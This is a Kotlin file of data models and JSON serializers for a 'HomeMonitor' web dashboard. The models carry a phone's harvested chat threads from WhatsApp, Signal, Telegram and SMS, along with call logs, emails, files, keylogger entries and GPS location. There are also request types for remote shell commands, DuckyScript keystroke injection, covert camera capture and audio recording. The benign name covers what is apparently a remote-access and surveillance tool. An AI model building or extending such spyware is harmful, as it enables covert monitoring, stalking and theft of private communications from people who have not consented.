package com.homemonitor

import org.json.JSONArray
import org.json.JSONObject

/**
 * WebDashboardModels
 *
 * Data Transfer Objects (DTOs) and JSON serializers for the HomeMonitor Advanced Web Control Dashboard.
 * Includes person-specific contact threads, 2-way in/out chat messages, call detail cards, and email viewer.
 */

// ── Auth DTOs ──

data class DashboardLoginRequest(
    val passcode: String = "",
    val totpCode: String = "",
) {
    companion object {
        fun fromJson(jsonStr: String): DashboardLoginRequest {
            return try {
                val json = JSONObject(jsonStr)
                DashboardLoginRequest(
                    passcode = json.optString("passcode", "").trim(),
                    totpCode = json.optString("totpCode", "").trim()
                )
            } catch (_: Exception) {
                DashboardLoginRequest()
            }
        }
    }
}

// ── File Manager DTOs ──

data class FileNodeItem(
    val name: String,
    val path: String,
    val isDirectory: Boolean,
    val sizeBytes: Long,
    val mimeType: String,
    val permissions: String,
    val lastModified: Long,
) {
    fun toJson(): JSONObject = JSONObject().apply {
        put("name", name)
        put("path", path)
        put("isDirectory", isDirectory)
        put("sizeBytes", sizeBytes)
        put("mimeType", mimeType)
        put("permissions", permissions)
        put("lastModified", lastModified)
    }
}

data class FileListResponse(
    val currentPath: String,
    val parentPath: String?,
    val items: List<FileNodeItem>,
) {
    fun toJson(): JSONObject = JSONObject().apply {
        put("currentPath", currentPath)
        put("parentPath", parentPath ?: "")
        val arr = JSONArray()
        items.forEach { arr.put(it.toJson()) }
        put("items", arr)
    }
}

// ── Person-Specific Chat & Messaging DTOs ──

data class ChatThreadItem(
    val threadId: String,
    val appId: String, // "whatsapp", "sms", "chatgpt", "facebook", "instagram", "telegram", "signal"
    val contactName: String,
    val phoneNumber: String = "",
    val avatarInitials: String,
    val lastSnippet: String,
    val lastTimestamp: Long,
    val unreadCount: Int = 0
) {
    fun toJson(): JSONObject = JSONObject().apply {
        put("threadId", threadId)
        put("appId", appId)
        put("contactName", contactName)
        put("phoneNumber", phoneNumber)
        put("avatarInitials", avatarInitials)
        put("lastSnippet", lastSnippet)
        put("lastTimestamp", lastTimestamp)
        put("unreadCount", unreadCount)
    }
}

data class ChatMessageItem(
    val messageId: String,
    val threadId: String,
    val appId: String,
    val senderName: String,
    val text: String,
    val isOutgoing: Boolean, // true = Cyan right bubble (Out), false = Slate left bubble (In)
    val timestamp: Long
) {
    fun toJson(): JSONObject = JSONObject().apply {
        put("messageId", messageId)
        put("threadId", threadId)
        put("appId", appId)
        put("senderName", senderName)
        put("text", text)
        put("isOutgoing", isOutgoing)
        put("timestamp", timestamp)
    }
}

// ── Call Log Detail DTO ──

data class CallLogDetailDto(
    val callId: String,
    val contactName: String,
    val phoneNumber: String,
    val avatarInitials: String,
    val durationStr: String, // e.g. "0:02:07"
    val isIncoming: Boolean, // true = ↙ Incoming (Green), false = ↗ Outgoing (Red)
    val status: String, // "Answered", "Missed", "Rejected"
    val timestamp: Long
) {
    fun toJson(): JSONObject = JSONObject().apply {
        put("callId", callId)
        put("contactName", contactName)
        put("phoneNumber", phoneNumber)
        put("avatarInitials", avatarInitials)
        put("durationStr", durationStr)
        put("isIncoming", isIncoming)
        put("status", status)
        put("timestamp", timestamp)
    }
}

// ── Email Detail DTO ──

data class EmailDetailDto(
    val emailId: String,
    val subject: String,
    val senderName: String,
    val fromAddress: String,
    val toAddress: String,
    val snippet: String,
    val body: String,
    val timestamp: Long
) {
    fun toJson(): JSONObject = JSONObject().apply {
        put("emailId", emailId)
        put("subject", subject)
        put("senderName", senderName)
        put("fromAddress", fromAddress)
        put("toAddress", toAddress)
        put("snippet", snippet)
        put("body", body)
        put("timestamp", timestamp)
    }
}

// ── Shell Execution DTOs ──

data class ShellExecRequest(
    val command: String = "",
    val context: String = "system", // "system" or "termux"
) {
    companion object {
        fun fromJson(jsonStr: String): ShellExecRequest {
            return try {
                val json = JSONObject(jsonStr)
                ShellExecRequest(
                    command = json.optString("command", "").trim(),
                    context = json.optString("context", "system").trim().lowercase()
                )
            } catch (_: Exception) {
                ShellExecRequest()
            }
        }
    }
}

data class ShellExecResponse(
    val command: String,
    val exitCode: Int,
    val output: String,
    val context: String,
) {
    fun toJson(): JSONObject = JSONObject().apply {
        put("command", command)
        put("exitCode", exitCode)
        put("output", output)
        put("context", context)
    }
}

// ── DuckyScript DTOs ──

data class DuckyExecuteRequest(
    val scriptContent: String = "",
) {
    companion object {
        fun fromJson(jsonStr: String): DuckyExecuteRequest {
            return try {
                val json = JSONObject(jsonStr)
                DuckyExecuteRequest(
                    scriptContent = json.optString("scriptContent", "").trim()
                )
            } catch (_: Exception) {
                DuckyExecuteRequest()
            }
        }
    }
}

// ── Camera & Audio DTOs ──

data class CameraCaptureRequest(
    val lens: String = "back", // "back" or "front"
) {
    companion object {
        fun fromJson(jsonStr: String): CameraCaptureRequest {
            return try {
                val json = JSONObject(jsonStr)
                CameraCaptureRequest(
                    lens = json.optString("lens", "back").trim().lowercase()
                )
            } catch (_: Exception) {
                CameraCaptureRequest()
            }
        }
    }
}

data class AudioRecordRequest(
    val durationSeconds: Int = 30,
) {
    companion object {
        fun fromJson(jsonStr: String): AudioRecordRequest {
            return try {
                val json = JSONObject(jsonStr)
                AudioRecordRequest(
                    durationSeconds = json.optInt("durationSeconds", 30).coerceIn(5, 600)
                )
            } catch (_: Exception) {
                AudioRecordRequest()
            }
        }
    }
}

// ── Log Entry DTO ──

data class LogEntryItem(
    val id: String,
    val category: String, // "keylog", "notification", "sms", "contact", "browser", "youtube", "social"
    val sourceApp: String,
    val title: String,
    val body: String,
    val extraUrl: String = "",
    val timestamp: Long,
) {
    fun toJson(): JSONObject = JSONObject().apply {
        put("id", id)
        put("category", category)
        put("sourceApp", sourceApp)
        put("title", title)
        put("body", body)
        put("extraUrl", extraUrl)
        put("timestamp", timestamp)
    }
}

// ── Location DTO ──

data class LocationTelemetryDto(
    val latitude: Double,
    val longitude: Double,
    val altitude: Double,
    val speed: Float,
    val accuracy: Float,
    val provider: String,
    val timestamp: Long,
) {
    fun toJson(): JSONObject = JSONObject().apply {
        put("latitude", latitude)
        put("longitude", longitude)
        put("altitude", altitude)
        put("speed", speed)
        put("accuracy", accuracy)
        put("provider", provider)
        put("timestamp", timestamp)
    }
}
